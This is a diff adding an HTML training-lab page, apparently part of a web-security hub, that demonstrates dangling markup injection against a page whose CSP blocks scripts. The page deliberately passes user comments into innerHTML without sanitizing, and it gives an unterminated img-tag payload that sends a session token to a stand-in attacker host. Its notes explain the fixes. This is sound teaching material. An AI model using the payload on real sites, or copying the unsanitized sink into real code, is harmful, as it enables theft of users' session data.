@@ -1,0 +1,61 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Lab 32: CSP's blind spot, dangling markup</title>
+  <meta http-equiv="Content-Security-Policy" content="script-src 'self'">
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+  <nav><a href="../index.html">&larr; Back to hub</a></nav>
+  <h1>Lab 32: Comments, with the same CSP as lab 31</h1>
+  <p class="tags"><span>Source: location.search</span><span class="sink">Sink: innerHTML (CSP doesn't help here)</span></p>
+
+  <section class="lab">
+    <form action="">
+      <label>Comment: <input name="comment" size="50"></label>
+      <button>Post</button>
+    </form>
+    <div id="page" class="output"></div>
+  </section>
+
+  <section class="notes">
+    <h2>What is happening</h2>
+    <p>
+      Same <code>script-src 'self'</code> policy as <a href="31-csp-blocks-innerhtml.html">lab 31</a>,
+      and the comment still goes straight into <code>innerHTML</code> with no sanitizing. The page
+      also renders a session token further down, in the same <code>innerHTML</code> call, below
+      the comment.
+    </p>
+    <h2>The payload doesn't use any script at all</h2>
+    <p>Submit this as your comment:</p>
+    <pre><code>&lt;img src="https://attacker.example.com/leak?data=</code></pre>
+    <p>
+      No <code>&gt;</code>, no closing quote. Check your browser's Network tab (open it before
+      submitting) and you'll see a request actually go out to <code>attacker.example.com</code>,
+      with the page's session token stuffed into its URL. It won't actually arrive anywhere, since
+      that's a reserved, non-resolving example domain, picked specifically so this lab can't leak
+      anything to a real server. The request itself is the point.
+    </p>
+    <h2>Why CSP doesn't stop this</h2>
+    <p>
+      Nothing here runs as script. The attribute you left open just keeps consuming the page's own
+      markup, including the real token, as part of its own value, until a quote character from
+      somewhere further down the page closes it off. That's an <b>image load</b>, which
+      <code>script-src</code> was never meant to govern. This technique is called
+      <b>dangling markup injection</b>: it steals data using nothing but HTML and the fact that an
+      unterminated attribute keeps eating everything after it.
+    </p>
+    <h2>What would actually stop it</h2>
+    <p>
+      Fixing the sink, same as every other lab in this hub: sanitize or escape the comment before
+      it reaches <code>innerHTML</code> (see <a href="28-search-dompurify-safe.html">lab 28</a>), so
+      there's no unterminated attribute to exploit in the first place. A CSP with a restrictive
+      <code>img-src</code> (instead of leaving it unset, which defaults to "allow everything") would
+      also have stopped <i>this specific</i> exfiltration channel, though not the underlying bug.
+    </p>
+  </section>
+
+  <script src="32-csp-dangling-markup.js"></script>
+</body>
+</html>
